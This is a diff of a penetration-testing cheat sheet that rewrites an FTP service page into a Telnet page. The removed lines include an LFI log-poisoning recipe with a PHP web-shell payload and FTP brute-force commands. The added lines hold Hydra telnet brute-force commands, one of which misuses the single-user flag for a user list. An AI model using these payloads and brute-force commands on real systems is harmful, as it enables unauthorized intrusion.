@@ -13,7 +13,11 @@ Default Port: **`23`**
 PORT   STATE SERVICE
 23/tcp open  telnet
 ```
- 
+```bash
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Netkit telnet-ssl telnetd
+```
+
 When [**Nmap**](https://nmap.org) does not get the service header, it uses the [**IANA**](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) db to determine the name of the service associated with that port.
 
 ---
@@ -77,64 +81,22 @@ ftp> more .htaccess
 #### Connect
 
 ```bash
-# default port (21)
-ftp peter@192.168.1.2
-ftp anonymous@192.168.1.2
-ncftp -u peter -p 'Passw0rd' 192.168.1.2
-lftp -u anonymous, 192.168.1.2
-lftp -u peter,'Passw0rd' 192.168.1.2
-
-# ftps (error: Fatal error: Certificate verification: Not trusted)
-lftp :~> set ssl:verify-certificate false
+# default port (23)
+telnet 192.168.1.2
 
 # other port
-lftp -u peter,'Passw0rd' 192.168.1.2 -p 1234
-ncftp -u peter -p 'Passw0rd' -P 1234 192.168.1.2
-```
-
----
-
-### Remote Code Execution (RCE)
-
-#### Log Poisoning
-
-If it detects a **Local File Inclusion (LFI)** and manages to read the **`/etc/passwd`** file.  
-
-> ##### WARNING
-> You should also verify that **port 21 (FTP)** is in the **open** state.
-{: .block-warning }
-
-```bash
-file.php?file=/etc/passwd
-```
-
-If we can read the **FTP log file** located at **`/var/log/vsftpd.log`**.
-
-```bash
-file.php?file=/var/log/vsftpd.log
-```
-
-An attacker can poison that log file by **injecting PHP code** into a fake login.
-
-```bash
-lftp -u '<?php system($_GET["cmd"]); ?>', 192.168.1.2
-```
-
-We now have **Remote Command Execution (RCE)** on the destination server.
-
-```bash
-file.php?file=/var/log/vsftpd.log&cmd=id
+telnet 192.168.1.2 1234
 ```
 
 ---
 
 ### Brute Force
 
+([**Telnet**](https://en.wikipedia.org/wiki/Telnet) is an excessively slow protocol, to avoid false negatives do **not implement threads**.)
+
 #### Password
 
 If you got a **`username`** and need the **`password`** this is the way.
-
-([**Telnet**](https://en.wikipedia.org/wiki/Telnet) is an excessively slow protocol, to avoid false negatives do **not implement threads**.)
 
 ```bash
 hydra -t 1 -l user -P /opt/techyou.txt telnet://192.168.1.2 -V -F -I
@@ -145,12 +107,7 @@ hydra -t 1 -l user -P /opt/techyou.txt telnet://192.168.1.2 -V -F -I
 If you have a **`password`** and need the **`username`** this is the way.
 
 ```bash
-# default port (21)
-ncrack -U users.dic --pass Passw0rd ftp://192.168.1.2 -f
-hydra -t 64 -L /opt/techyou.txt -p Passw0rd ftp://192.168.1.2 -f -I
-# other port
-ncrack -U users.dic --pass Passw0rd ftp://192.168.1.2:1234 -f
-hydra -t 64 -L users.dic -p Passw0rd ftp://192.168.1.2:1234 -f -I
+hydra -t 1 -l users.dic -p P@ssword1 telnet://192.168.1.2 -V -F -I
 ```
 
 ---
@@ -159,84 +116,34 @@ hydra -t 64 -L users.dic -p Passw0rd ftp://192.168.1.2:1234 -f -I
 
 #### Interesting Files
 
-- **`/srv/ftp`** - Default **directory** path.
-- **`/var/log/vsftpd.log`** - Default **log** file path.
-- **`/etc/vsftpd.conf`** - Default path of the **configuration** file.
+- **`/etc/inetd.conf`**
+- **`/etc/xinetd.d/telnet`**
+- **`/etc/xinetd.d/stelnet`**
 
 #### Install
 
 ```bash
 # client
-apt install -y ftp
-apt install -y lftp
+apt install -y telnet
+apt install -y telnet-ssl
 
 # server
-apt install -y vsftpd
+apt install -y telnetd
+apt install -y telnetd-ssl
 ```
 
 #### Change Port
 
 ```bash
+nano /etc/services
+```
+
+```bash
 # default port
-listen_port=21
+telnet    23/tcp
 
 # other port
-listen_port=1234
-```
-
-#### User (Guest)
-
-```bash
-# enable
-anonymous_enable=YES
-
-# disable
-anonymous_enable=NO
-```
-
-#### Banner Grabbing (Disable)
-
-```bash
-# show version
-#ftpd_banner=Welcome to blah FTP service.
-21/tcp open  ftp     vsftpd 3.0.3
-
-# hidden version
-ftpd_banner=Welcome to blah FTP service.
-21/tcp open  ftp     vsftpd
-```
-
-#### Daemon (Listener)
-
-```bash
-# external (0.0.0.0)
-listen_address=0.0.0.0
-listen_port=21
-listen=YES
-
-# internal (localhost)
-listen_address=127.0.0.1
-listen_port=21
-listen=YES
-```
-
-#### Service
-
-```bash
-service vsftpd start
-service vsftpd stop
-service vsftpd restart
-service vsftpd status
-
-/etc/init.d/vsftpd start
-/etc/init.d/vsftpd stop
-/etc/init.d/vsftpd restart
-/etc/init.d/vsftpd status
-
-systemctl start vsftpd
-systemctl stop vsftpd
-systemctl restart vsftpd
-systemctl status vsftpd
+telnet    1234/tcp
 ```
 
 ---
